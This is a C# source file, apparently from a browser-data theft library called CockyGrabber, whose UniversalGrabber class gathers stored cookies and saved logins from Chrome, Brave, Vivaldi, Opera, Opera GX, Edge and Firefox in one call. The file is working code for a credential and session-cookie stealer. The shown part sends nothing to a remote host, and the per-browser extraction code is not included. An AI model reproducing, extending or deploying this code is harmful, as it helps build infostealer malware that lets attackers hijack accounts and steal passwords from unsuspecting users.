using CockyGrabber.Utility;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web.Script.Serialization;

namespace CockyGrabber.Grabbers
{
    public class UniversalGrabber
    {
        #region Grabbers
        public ChromeGrabber CG { get; set; }
        public BraveGrabber BG { get; set; }
        public VivaldiGrabber VG { get; set; }
        public OperaGrabber OG { get; set; }
        public OperaGxGrabber OGG { get; set; }
        public EdgeGrabber EG { get; set; }
        public FirefoxGrabber FG { get; set; }
        #endregion

        public UniversalGrabber()
        {
            CG = new ChromeGrabber();
            BG = new BraveGrabber();
            VG = new VivaldiGrabber();
            OG = new OperaGrabber();
            OGG = new OperaGxGrabber();
            EG = new EdgeGrabber();
            FG = new FirefoxGrabber();
        }
        public UniversalGrabber(ChromeGrabber cg, BraveGrabber bg, VivaldiGrabber vg, OperaGrabber og, OperaGxGrabber ogg, EdgeGrabber eg, FirefoxGrabber fg)
        {
            CG = cg;
            BG = bg;
            VG = vg;
            OG = og;
            OGG = ogg;
            EG = eg;
            FG = fg;
        }

        #region GetCookies()
        public IEnumerable<Chromium.Cookie> GetAllChromiumCookiesBy(Chromium.CookieHeader by, object value)
        {
            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();

            // Add Cookies to list:
            cookies.AddRange(CG.GetCookiesBy(by, value));
            cookies.AddRange(BG.GetCookiesBy(by, value));
            cookies.AddRange(VG.GetCookiesBy(by, value));
            cookies.AddRange(OG.GetCookiesBy(by, value));
            cookies.AddRange(OGG.GetCookiesBy(by, value));
            cookies.AddRange(EG.GetCookiesBy(by, value));

            return cookies;
        }

        public IEnumerable<Chromium.Cookie> GetAllChromiumCookies()
        {
            List<Chromium.Cookie> cookies = new List<Chromium.Cookie>();

            // Add Cookies to list:
            cookies.AddRange(CG.GetCookies());
            cookies.AddRange(BG.GetCookies());
            cookies.AddRange(VG.GetCookies());
            cookies.AddRange(OG.GetCookies());
            cookies.AddRange(OGG.GetCookies());
            cookies.AddRange(EG.GetCookies());

            return cookies;
        }

        public Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>> GetAllCookiesByChromium(Chromium.CookieHeader by, object value)
            => new Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>>(GetAllChromiumCookiesBy(by, value), FG.GetCookies());
        public Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>> GetAllCookiesByFirefox(Firefox.CookieHeader by, object value)
            => new Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>>(GetAllChromiumCookies(), FG.GetCookiesBy(by, value));

        public Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>> GetAllCookies()
            => new Tuple<IEnumerable<Chromium.Cookie>, IEnumerable<Firefox.Cookie>>(GetAllChromiumCookies(), FG.GetCookies());
        #endregion

        #region GetLogins()
        public IEnumerable<Chromium.Login> GetAllChromiumLoginsBy(Chromium.LoginHeader by, object value)
        {
            List<Chromium.Login> logins = new List<Chromium.Login>();

            // Add Logins to list:
            logins.AddRange(CG.GetLoginsBy(by, value));
            logins.AddRange(BG.GetLoginsBy(by, value));
            logins.AddRange(VG.GetLoginsBy(by, value));
            logins.AddRange(OG.GetLoginsBy(by, value));
            logins.AddRange(OGG.GetLoginsBy(by, value));
            logins.AddRange(EG.GetLoginsBy(by, value));

            return logins;
        }

        public IEnumerable<Chromium.Login> GetAllChromiumLogins()
        {
            List<Chromium.Login> logins = new List<Chromium.Login>();

            // Add Logins to list:
            logins.AddRange(CG.GetLogins());
            logins.AddRange(BG.GetLogins());
            logins.AddRange(VG.GetLogins());
            logins.AddRange(OG.GetLogins());
            logins.AddRange(OGG.GetLogins());
            logins.AddRange(EG.GetLogins());

            return logins;
        }

        public Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>> GetAllLoginsByChromium(Chromium.LoginHeader by, object value)
            => new Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>>(GetAllChromiumLoginsBy(by, value), FG.GetLogins());
        public Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>> GetAllLoginsByFirefox(Firefox.LoginHeader by, object value)
            => new Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>>(GetAllChromiumLogins(), FG.GetLoginsBy(by, value));

        public Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>> GetAllLogins()
            => new Tuple<IEnumerable<Chromium.Login>, IEnumerable<Firefox.Login>>(GetAllChromiumLogins(), FG.GetLogins());
        #endregion
    }
}
